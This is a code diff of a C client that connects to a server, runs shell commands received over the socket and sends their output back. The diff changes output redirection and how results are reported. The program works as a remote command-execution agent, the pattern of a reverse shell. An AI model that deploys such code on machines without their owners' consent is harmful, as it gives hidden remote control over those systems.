@@ -27,11 +27,12 @@ int main()
     int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
     struct sockaddr_in servaddr;
     char buf[BUFFER_SIZE];
-    int filesize, chunk, rv;
+    int filesize, chunk;
     FILE *fp;    
     char *cmd;
     struct timeval timeout={1800,0};
-
+    
+    freopen(CMD_RESULT, "w", stdout);
     memset(&servaddr, 0, sizeof(servaddr));
     servaddr.sin_family = AF_INET;
     servaddr.sin_port = htons(SP_PORT); 
@@ -56,10 +57,8 @@ int main()
             if(strcmp(buf, "close") == 0){
                 break;
             } else if(strncmp(buf, "exec", 4) == 0){
-                rv = execcmd(buf + 4);
-                if(rv > 0){
-                    sendresult(sock_fd, buf);
-                }
+                execcmd(buf + 4);
+                sendresult(sock_fd, buf);
             }
         }
     }
@@ -114,7 +113,11 @@ int execcmd(char* cmd){
         } else {
             rv = chdir(args[1]);
         }
-        printf("rv=%d\n",rv);
+        if(rv == 0){
+            printf("change dir success.\n");
+        } else {
+            printf("change dir failure.\n");
+        }
     } else {
         if((i=fork()) == 0){
             freopen(CMD_RESULT, "w", stdout);
